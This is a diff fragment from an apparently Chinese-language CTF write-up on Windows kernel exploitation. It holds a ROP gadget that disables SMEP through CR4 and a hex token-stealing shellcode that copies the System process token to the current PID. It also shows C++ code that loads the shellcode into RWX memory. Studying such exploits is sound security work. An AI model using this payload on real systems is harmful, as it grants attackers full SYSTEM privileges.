@@ -1272,15 +1272,15 @@ payload[39] = ADDR(kernel_base + 0x3A0A87); //mov cr4, rcx; ret
 然後把組譯結果放到 POC 中，並且把第 54 和 55 個位元組換成目前的程序的 PID (使用 GetCurrentProcessId)
 ```c++
 char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4c\x8B\x8a\x48\x04\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x24\xF0\x48\x8B\x51\xF8\x48\x81\xFA\x00\x00\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xC3";
-```
-接下來用 VirtualAlloc 來分配一塊擁有 RWE 權限的記憶體，最後把 VirtuAlloc 回傳的位址放到 ROP Chain 裡。(原題解中只有 RW，然後手動用 ASM 秀一波 PML4E 定址然後手動改 XD 位元，我其實不太懂為甚麼要這樣 <span style="font-size: 30px;">🤨</span>)
 
-```c++
 DWORD pid = GetCurrentProcessId();
 
 shellcode[54] = (char)pid;
 shellcode[55] = (char)(pid >> 8);
+```
+接下來用 VirtualAlloc 來分配一塊擁有 RWE 權限的記憶體，最後把 VirtuAlloc 回傳的位址放到 ROP Chain 裡。(原題解中只有 RW，然後手動用 ASM 秀一波 PML4E 定址然後手動改 XD 位元，我其實不太懂為甚麼要這樣 <span style="font-size: 30px;">🤨</span>)
 
+```c++
 PVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 memcpy(shellcode_addr, shellcode, sizeof(shellcode));
 
